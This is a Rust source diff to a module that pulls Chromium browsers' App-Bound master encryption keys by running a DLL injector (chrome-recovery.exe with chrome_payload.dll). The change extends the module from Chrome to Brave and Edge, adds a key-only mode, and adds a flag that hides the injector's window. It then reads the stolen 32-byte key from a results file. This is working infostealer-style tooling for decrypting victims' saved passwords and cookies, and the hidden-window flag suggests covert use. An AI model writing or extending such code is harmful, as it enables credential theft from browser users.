@@ -1,4 +1,4 @@
-//! Chrome App-Bound key recovery via DLL injection (chrome-recovery + chrome_payload.dll).
+//! Chromium App-Bound key recovery via DLL injection (chrome-recovery + chrome_payload.dll).
 
 use std::{
     fs,
@@ -8,9 +8,13 @@ use std::{
     time::Duration,
 };
 
+#[cfg(windows)]
+use std::os::windows::process::CommandExt;
+
 use serde_json::Value;
 
 const PUBLIC_RESULT: &str = r"C:\Users\Public\chrome_recovery_result.json";
+const CREATE_NO_WINDOW: u32 = 0x0800_0000;
 
 fn result_paths() -> Vec<PathBuf> {
     vec![
@@ -19,7 +23,7 @@ fn result_paths() -> Vec<PathBuf> {
     ]
 }
 
-fn find_injector_and_dll() -> Option<(PathBuf, PathBuf)> {
+fn find_injector() -> Option<PathBuf> {
     let mut dirs = Vec::new();
     if let Ok(exe) = std::env::current_exe() {
         if let Some(d) = exe.parent() {
@@ -35,10 +39,19 @@ fn find_injector_and_dll() -> Option<(PathBuf, PathBuf)> {
         let inj = dir.join("chrome-recovery.exe");
         let dll = dir.join("chrome_payload.dll");
         if inj.exists() && dll.exists() {
-            return Some((inj, dll));
+            return Some(inj);
         }
     }
     None
+}
+
+fn browser_filter(browser_name: &str) -> Option<&'static str> {
+    match browser_name {
+        "Chrome" => Some("chrome"),
+        "Brave" => Some("brave"),
+        "Edge" => Some("edge"),
+        _ => None,
+    }
 }
 
 fn hex_to_key(hex: &str) -> Option<Vec<u8>> {
@@ -68,18 +81,25 @@ fn read_master_key_from_results() -> Option<Vec<u8>> {
     None
 }
 
-/// Run chrome-recovery.exe and return the 32-byte Chrome app-bound master key.
-pub fn fetch_chrome_app_bound_key() -> Option<Vec<u8>> {
-    let (injector, _dll) = find_injector_and_dll()?;
+/// Run chrome-recovery.exe for a Chromium browser and return the 32-byte app-bound master key.
+pub fn fetch_app_bound_key(browser_name: &str) -> Option<Vec<u8>> {
+    let filter = browser_filter(browser_name)?;
+    let injector = find_injector()?;
 
     for path in result_paths() {
         let _ = fs::remove_file(path);
     }
 
-    let status = Command::new(&injector)
-        .arg("chrome")
-        .status()
-        .ok()?;
+    let injector_dir = injector.parent()?.to_path_buf();
+    let mut cmd = Command::new(&injector);
+    cmd.arg(filter)
+        .arg("--key-only")
+        .current_dir(&injector_dir);
+
+    #[cfg(windows)]
+    cmd.creation_flags(CREATE_NO_WINDOW);
+
+    let status = cmd.status().ok()?;
 
     if !status.success() {
         eprintln!("[chrome-inject] chrome-recovery exited with {status}");
@@ -94,6 +114,6 @@ pub fn fetch_chrome_app_bound_key() -> Option<Vec<u8>> {
         thread::sleep(Duration::from_secs(1));
     }
 
-    eprintln!("[chrome-inject] timeout waiting for recovery result");
+    eprintln!("[chrome-inject] timeout waiting for recovery result ({browser_name})");
     None
 }
